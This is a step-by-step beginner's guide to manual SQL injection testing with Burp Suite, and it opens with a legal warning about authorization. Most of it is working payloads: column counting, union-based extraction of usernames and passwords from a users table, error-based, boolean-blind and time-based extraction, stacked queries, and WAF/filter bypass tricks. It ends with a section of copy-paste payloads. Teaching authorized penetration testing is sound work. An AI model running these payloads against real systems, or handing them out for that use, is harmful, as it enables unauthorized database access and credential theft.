
# Manual SQL Injection Testing Guide for Complete Beginners

**⚠️ Legal Warning:** Only test systems you own or have written permission to test. Unauthorized testing is illegal.

***

## 0) Tools and Setup

**Required Tools:**
- Web browser
- Burp Suite Community Edition

**Burp Configuration:**
1. Navigate to **Proxy → Intercept** and set to **Off** (allows passive monitoring)
2. Go to **Proxy → Options** and ensure your browser is configured to use Burp's proxy (typically 127.0.0.1:8080)
3. Open **Target → Site map** to view all captured requests
4. Familiarize yourself with **Repeater** (for modifying and resending requests) and **Comparer** (for comparing responses)

***

## 1) Find Input Points

**What to do:**
- Browse every page of the target application
- Submit all forms with simple test values (e.g., "test", "123")
- In Burp's Site map, identify requests containing:
  - URL query parameters: `?id=1`, `?page=2`, `?search=keyword`
  - POST body parameters (form data or JSON)
  - Cookie values: `session=abc123`, `role=user`, `tracking=xyz`

**Goal:**
Create an inventory list in this format:
```
[HTTP_METHOD] [PATH] | parameter_name
```
Examples:
```
GET /product?id=1 | id
POST /login | username, password
GET /search?q=test | q
```

**Expected result:**
Most requests return HTTP 200 status. Note the **response length in bytes** (displayed in Burp's top-right corner) for each request—this becomes your baseline.

***

## 2) Establish a Baseline

**What to do:**
1. Right-click a request in Burp and select **Send to Repeater**
2. In Repeater, test the parameter with a known valid value (e.g., `id=1`)
3. Click **Send** and record:
   - **HTTP status code** (e.g., 200, 404, 500)
   - **Response length** in bytes
   - A **marker word or phrase** that appears in the response (e.g., product title "Laptop XPS 15")

**Expected result:**
You should see consistent, predictable results. Example baseline:
```
Request: GET /product?id=1
Status: 200
Length: 6,123 bytes
Marker: "Laptop XPS 15"
```

This baseline is critical for detecting anomalies in subsequent tests.[1][2]

***

## 3) Detect Quote Context and Comment Style

**Testing for quote context:**

Send these payloads one at a time for the same parameter:
```
id=1        → baseline (control)
id=1'       → test single quote
id=1"       → test double quote
id=1a       → test invalid type (for numeric context)
```

**Interpreting results:**
- If `id=1'` causes an error but `id=1"` doesn't → **single-quote context**
- If `id=1"` causes an error but `id=1'` doesn't → **double-quote context**  
- If neither quote causes errors but `id=1a` does → **numeric context** (no quotes needed)

**Finding the right comment syntax:**

SQL comments remove everything after them, which helps close broken queries. Test these in order:
```
MySQL/MSSQL: --+ or -- (space after dashes)
MySQL:       #
All:         /* */
```

Example test: `id=1' --+`

**Success indicators:**
- Status code changes: 200 → 500 or 200 → 302
- Response length changes by >5%
- SQL error messages appear (e.g., "SQL syntax error", "ORA-01756") then disappear after adding the comment[2][1]

***

## 4) Decision Tree: Choose Your Attack Method

Based on what you observe, select the appropriate technique:

| Observation | Attack Method | Go to Section |
|------------|---------------|---------------|
| SQL error messages visible in response | Error-based, then Union | §5, §6 |
| Page content changes between true/false inputs | Boolean-based blind | §7 |
| No visible changes at all | Time-based blind | §8 |
| Page displays table rows or lists data | Union-based (prioritize this) | §5 |

[3][1]

***

## 5) Union-Based SQL Injection (5 Steps)

**Assumptions for examples below:**
- Single-quote context
- MySQL database
- Adjust functions for other databases (see §11)

### Move 1: Determine Column Count

**Method A - ORDER BY technique:**
```sql
' ORDER BY 1 --+    → send, check response
' ORDER BY 2 --+    → send, check response  
' ORDER BY 3 --+    → send, check response
' ORDER BY 4 --+    → send, check response
```

Increment until you get an error. The last successful number = column count.

**Method B - UNION NULL technique:**
```sql
' UNION SELECT NULL --+
' UNION SELECT NULL,NULL --+
' UNION SELECT NULL,NULL,NULL --+
' UNION SELECT NULL,NULL,NULL,NULL --+
```

Continue until the response looks normal (no error). The number of NULLs = column count.

**Expected result:**
If ORDER BY 3 succeeds but ORDER BY 4 fails → **3 columns**.[4][5]

### Move 2: Identify Printable Columns

Test each column position to see which displays on the page:
```sql
' UNION SELECT 'A',NULL,NULL --+
' UNION SELECT NULL,'A',NULL --+
' UNION SELECT NULL,NULL,'A' --+
```

**Expected result:**
The letter **'A'** appears somewhere on the page only for columns that render output. Note these positions (e.g., columns 2 and 3).[5][6]

### Move 3: Fingerprint the Database

Use database-specific functions in printable columns:

**MySQL:**
```sql
' UNION SELECT database(),user(),version() --+
```

**Microsoft SQL Server:**
```sql
' UNION SELECT DB_NAME(),SYSTEM_USER,@@version --
```

**PostgreSQL:**
```sql
' UNION SELECT current_database(),current_user,version() --
```

**Expected result:**
The page displays database name, username, and version string (e.g., "shop_db", "dbuser@localhost", "MySQL 8.0.35").[5]

### Move 4: Enumerate Tables and Columns

**List all tables (MySQL):**
```sql
' UNION SELECT table_schema,table_name,3 FROM information_schema.tables --+
```

**List columns for a specific table:**
```sql
' UNION SELECT table_name,column_name,data_type FROM information_schema.columns WHERE table_name='users' --+
```

**Expected result:**
You see schema names, table names (e.g., "customers", "users", "orders"), and column names (e.g., "username", "password", "email").[4][5]

### Move 5: Extract Data

**If multiple printable columns:**
```sql
' UNION SELECT username,password,email FROM users --+
```

**If only one printable column, use concatenation:**

MySQL:
```sql
' UNION SELECT CONCAT(username,':',password),NULL,NULL FROM users --+
```

PostgreSQL:
```sql
' UNION SELECT username||':'||password,NULL,NULL FROM users --
```

Microsoft SQL Server:
```sql
' UNION SELECT username+':'+password,NULL,NULL FROM users --
```

**Expected result:**
Usernames, password hashes, and emails appear where the 'A' marker appeared earlier.[6][5]

***

## 6) Error-Based SQL Injection (3 Steps)

Use this when SQL errors are displayed but UNION isn't working yet.

### Move 1: Confirm Error Leakage

**MySQL:**
```sql
' AND CAST((SELECT database()) AS SIGNED) --+
```

**Microsoft SQL Server:**
```sql
' AND 1=CONVERT(INT,(SELECT DB_NAME())) --
```

**Expected result:**
An SQL error message appears in the page containing data (e.g., "Conversion failed when converting 'shop_db'").[1][2]

### Move 2: Use Advanced Error Payload

**MySQL duplicate key error:**
```sql
' AND (SELECT 1 FROM(
    SELECT COUNT(*),
           CONCAT(0x7e,database(),0x7e,FLOOR(RAND()*2)) x
    FROM information_schema.tables
    GROUP BY x) t) --+
```

**Expected result:**
Error message includes the database name between tildes: `~shop_db~`.[1]

### Move 3: Transition to Union

Once you have basic information, use the UNION technique (§5) for systematic data extraction.

***

## 7) Boolean-Based Blind SQL Injection (4 Steps)

Use this when the page doesn't show errors but behaves differently for true vs. false conditions.

**Choose a signal:**
Use either response length or presence/absence of a specific word. Stick with one signal throughout.

### Move 1: Confirm True/False Behavior

```sql
' AND 1=1 --+    → should match baseline (TRUE)
' AND 1=2 --+    → should differ from baseline (FALSE)
```

**Expected result:**
TRUE condition: page looks normal, same length as baseline  
FALSE condition: page changes (different length, missing content, or error).[7][3]

### Move 2: Determine Target String Length

**MySQL:**
```sql
' AND LENGTH(database())=1 --+
' AND LENGTH(database())=2 --+
...
' AND LENGTH(database())=8 --+    → TRUE response means 8 characters
```

**Microsoft SQL Server:**
```sql
' AND LEN(DB_NAME())=8 --
```

**PostgreSQL:**
```sql
' AND LENGTH(current_database())=8 --
```

**Expected result:**
When the guess equals the actual length, you get a TRUE response.[8][3]

### Move 3: Extract Characters Using Binary Search

Use ASCII values with binary search (range 32-126):

**MySQL template:**
```sql
' AND ASCII(SUBSTRING(database(),1,1))>64 --+
' AND ASCII(SUBSTRING(database(),1,1))>96 --+
' AND ASCII(SUBSTRING(database(),1,1))>112 --+
```

**Procedure:**
1. Start with mid-point 77 (between 32 and 126)
2. If TRUE → character is >77, search 78-126
3. If FALSE → character is ≤77, search 32-77
4. Repeat until you narrow down to single ASCII value
5. Convert ASCII to character (65=A, 97=a, etc.)
6. Increment position (1→2→3) and repeat

**Expected result:**
After 6-7 tests per character, you recover the entire string character-by-character.[9][3]

### Move 4: Extract Sensitive Data

Apply the same technique to extract passwords:
```sql
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>64 --+
```

Repeat the binary search for each character position.[10][8]

***

## 8) Time-Based Blind SQL Injection (3 Steps)

Use this when there are no visible changes whatsoever. Monitor response time in Burp Repeater's **Time** column.

### Move 1: Confirm Delay Capability

**MySQL:**
```sql
' AND SLEEP(5) --+
```

**Microsoft SQL Server:**
```sql
'; WAITFOR DELAY '00:00:05' --
```

**PostgreSQL:**
```sql
' AND CASE WHEN 1=1 THEN pg_sleep(5) ELSE 0 END --
```

**Expected result:**
Response takes ~5 seconds instead of normal <1 second.[3][7]

### Move 2: Test Conditional Delays

Check string length with delay as indicator:
```sql
' AND IF(LENGTH(database())=8,SLEEP(5),0) --+
```

**Expected result:**
- If length is 8 → delay of 5 seconds
- If length is not 8 → fast response (<1 second)[9][3]

### Move 3: Extract Characters via Delay

Use binary search with conditional delays:
```sql
' AND IF(ASCII(SUBSTRING(database(),1,1))>64,SLEEP(5),0) --+
' AND IF(ASCII(SUBSTRING(database(),1,1))>96,SLEEP(5),0) --+
```

**Expected result:**
Presence or absence of 5-second delay encodes the answer to each greater-than test.[3]

***

## 9) Context Variations to Test

Different injection points require syntax adjustments:

### Numeric Context (no quotes):
```sql
id=1 AND 1=1 --+
id=1 UNION SELECT 1,2,3 --+
```

### Double-Quote Context:
```sql
" AND "1"="1" --+
" UNION SELECT "A",NULL,NULL --+
```

### ORDER BY Injection:
```sql
' ORDER BY CASE WHEN SUBSTRING(database(),1,1)='a' THEN 1 ELSE 2 END --+
```

### LIMIT/OFFSET:
```sql
' LIMIT 0, CASE WHEN LENGTH(database())>8 THEN 1 ELSE 0 END --+
```

### JSON Body:
Edit the JSON in Repeater:
```json
{
  "id": "1' AND 1=1 -- ",
  "action": "view"
}
```

### Cookie Parameter:
```
Cookie: session=abc123; tracking=xyz' AND 1=1 --+
```
(URL-encode quotes if needed: `%27` for `'`)[2][1]

***

## 10) Stacked Queries Test

Stacked queries allow multiple statements separated by semicolons. Test once—if blocked, abandon.

**Microsoft SQL Server:**
```sql
'; WAITFOR DELAY '00:00:05' --
```

**PostgreSQL:**
```sql
'; SELECT pg_sleep(5) --
```

**Note:** MySQL typically disables stacked queries in PHP/mysqli.

**Expected result:**
A 5-second delay proves stacking is enabled.[2]

***

## 11) Database Function Reference

Quick reference for common functions across databases:

| Function | MySQL | MSSQL | PostgreSQL | Oracle |
|----------|-------|-------|------------|--------|
| Database name | `database()` | `DB_NAME()` | `current_database()` | `SELECT name FROM v$database` |
| User | `user()` | `SYSTEM_USER` | `current_user` | `SELECT user FROM dual` |
| Version | `version()` | `@@version` | `version()` | `SELECT banner FROM v$version` |
| Sleep/delay | `SLEEP(n)` | `WAITFOR DELAY '00:00:0n'` | `pg_sleep(n)` | `dbms_lock.sleep(n)` |
| Concatenation | `CONCAT(a,b)` | `a + b` | `a \|\| b` | `a \|\| b` or `CONCAT(a,b)` |

[5][1]

***

## 12) WAF/Filter Bypass Techniques

When input filters or Web Application Firewalls block your payloads:

| Technique | Example |
|-----------|---------|
| Replace spaces | `UNION/**/SELECT` or `UNION+SELECT` |
| Alternative comments | Try `--+`, `#`, `/* */`, or `-- ` (space) |
| Case variation | `UnIoN SeLeCt` instead of `UNION SELECT` |
| String splitting (MySQL) | `CONCAT('ad','min')` |
| String splitting (MSSQL) | `'ad'+'min'` |
| String splitting (PostgreSQL) | `'ad'\|\|'min'` |
| URL encoding | `%27` for `'`, `%22` for `"`, `%23` for `#` |
| Double encoding | `%2527` for `'` |

[7]

***

## 13) Documentation Checklist

Record these details for each successful injection:

- [ ] Request path and parameter name (e.g., `GET /product?id`)
- [ ] Context detected (single-quote, double-quote, or numeric)
- [ ] Working comment style (`--+`, `#`, `/* */`)
- [ ] Attack method used (Union, Error, Boolean, Time-based)
- [ ] Column count and printable column indices (e.g., "3 columns, positions 2 and 3 visible")
- [ ] Database type and version (e.g., "MySQL 8.0.35")
- [ ] Key functions that worked (`database()`, `CONCAT()`, etc.)
- [ ] First row of extracted data as proof (e.g., "admin:$2y$10$...")
- [ ] All successful payloads (for reproduction)

***

## 14) Common Beginner Mistakes & Fixes

| Error | Why It Fails | Fix |
|-------|-------------|-----|
| Using `--` without space | MySQL requires space or + after `--` | Use `--+` or `-- ` (with space) |
| Mixing quote styles | Context mismatch breaks syntax | Always match detected context (§3) |
| Column count mismatch in UNION | UNION requires equal columns in both SELECTs | Verify column count first (§5.1) |
| No visible change in blind | Signal is too subtle | Use response length or sleep delays |
| Forgetting to URL-encode | Special chars break in URLs | Encode in Burp Repeater: Ctrl+U |

[1][5]

***

## 15) Quick Copy-Paste Payloads

### Column Count Discovery:
```sql
' ORDER BY 1 --+
' ORDER BY 2 --+
' ORDER BY 3 --+
' ORDER BY 4 --+
```

OR

```sql
' UNION SELECT NULL --+
' UNION SELECT NULL,NULL --+
' UNION SELECT NULL,NULL,NULL --+
' UNION SELECT NULL,NULL,NULL,NULL --+
```

### Printable Column Test (4 columns):
```sql
' UNION SELECT 'A',NULL,NULL,NULL --+
' UNION SELECT NULL,'A',NULL,NULL --+
' UNION SELECT NULL,NULL,'A',NULL --+
' UNION SELECT NULL,NULL,NULL,'A' --+
```

### Schema Enumeration (MySQL):
```sql
-- List all tables:
' UNION SELECT table_schema,table_name,3 FROM information_schema.tables --+

-- List columns in 'users' table:
' UNION SELECT table_name,column_name,data_type FROM information_schema.columns WHERE table_name='users' --+
```

### Data Extraction (single printable column):
```sql
' UNION SELECT CONCAT(username,':',password),NULL,NULL FROM users --+
```

### Boolean Blind Probes:
```sql
' AND 1=1 --+
' AND 1=2 --+
' AND LENGTH(database())=8 --+
' AND ASCII(SUBSTRING(database(),1,1))>77 --+
```

### Time-Based Probes (MySQL):
```sql
' AND SLEEP(5) --+
' AND IF(LENGTH(database())=8,SLEEP(5),0) --+
' AND IF(ASCII(SUBSTRING(database(),1,1))>77,SLEEP(5),0) --+
```

***

## Summary

This guide provides a systematic, step-by-step methodology for manual SQL injection testing. Start by establishing baselines (§1-2), detect the context (§3), choose your attack method based on application behavior (§4), then execute Union (§5), Error (§6), Boolean blind (§7), or Time-based blind (§8) techniques. Always test only authorized systems and document your findings thoroughly (§13).[4][7][2][3][1]

**Key takeaways:**
- **Methodology matters:** Systematic testing beats random payload throwing
- **Context is critical:** Always detect quote style and comment syntax first
- **Choose the right technique:** Union when data displays, blind when it doesn't
- **Document everything:** Your notes are proof and enable reproduction

Practice these techniques in legal environments like HackTheBox, TryHackMe, or PortSwigger Academy before attempting real-world assessments.[7][1]
